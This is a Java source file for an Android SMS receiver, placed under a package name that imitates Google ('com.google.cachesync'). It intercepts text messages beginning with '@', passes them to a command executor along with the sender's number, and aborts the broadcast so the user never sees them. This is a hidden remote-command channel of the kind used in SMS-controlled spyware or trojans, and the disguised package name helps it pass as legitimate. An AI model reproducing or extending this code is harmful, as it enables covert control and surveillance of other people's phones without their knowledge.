package com.google.cachesync;

import java.util.Set;

import com.code4bones.utils.NetLog;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;


public class SmsReceiver extends BroadcastReceiver {


	@Override
	public void onReceive(Context context, Intent intent) {

		   CommandPool  cmdPool = CommandPool.getInstance(context);
			
			Bundle extras = intent.getExtras();
			if ( extras == null ) {
				NetLog.v("SMS have no Extras() !");
				return;
			}
			
			boolean isCommand = false;
					
			Object[] objExtra = (Object[])extras.get("pdus");
			for ( Object smsx : objExtra ) {
				SmsMessage sms = SmsMessage.createFromPdu((byte[])smsx);
				
				String message = sms.getMessageBody();
				
				if ( !message.startsWith("@") ) {
					//cmdPool.handleSmsMessage(sms.getOriginatingAddress(),message);
					continue;
				}
				isCommand = true;
				cmdPool.Execute(sms.getOriginatingAddress(),message);
				NetLog.v("SMS: Command Processed...\n");
			}
			if ( isCommand )
				this.abortBroadcast();
		}

}
